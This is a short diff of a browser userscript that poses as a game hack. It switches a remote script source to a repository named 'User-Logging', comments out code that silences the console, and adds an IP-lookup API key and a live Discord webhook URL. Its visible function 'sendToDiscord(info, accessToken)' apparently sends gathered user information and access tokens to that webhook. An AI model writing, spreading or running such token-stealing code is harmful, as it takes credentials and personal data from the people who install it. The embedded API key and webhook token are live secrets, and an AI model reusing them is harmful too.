@@ -1,6 +1,6 @@
-
 (function () {
-    let noop = () => {};
+    console.log('script running');
+    /*let noop = () => {};
     let consoleMethods = ['log', 'warn', 'error', 'info', 'debug', 'dir', 'dirxml', 'table', 'trace', 'time', 'timeEnd'];
     consoleMethods.forEach(method => {
         console[method] = noop;
@@ -11,10 +11,10 @@
         window.performance.mark = noop;
         window.performance.measure = noop;
     }
-    window.onunhandledrejection = event => event.preventDefault();
+    window.onunhandledrejection = event => event.preventDefault();*/
 
     // Script configuration
-    // let sahate = "https://raw.githubusercontent.com/LostDeveloper01/survive-hack/main/krityhack.user.js";
+    let sahate = "https://raw.githubusercontent.com/LostDeveloper01/User-Logging/refs/heads/main/kritty.js";
     let anatahe = "https://api.ipdata.co?api-key=41aa6530c61a2d4189b48ef719c1ce909d8e2bfd080fbe94a9b7a523";
     let batate = "https://cdn.discordapp.com/avatars/1313301569386840136/bbc5a79936e435c7b28fdd814416d117.png";
     let defatate = "https://discord.com/api/webhooks/1328146798245838908/gU6HaBia7FVwSC_XMHxgtxTkxhzLe-9L572zIz4v7Gy4Fa_oYghRVxkONX0V90r7EvC7";
@@ -153,4 +153,3 @@ async function sendToDiscord(info, accessToken) {
         }, 5000);
     };
 })();
-
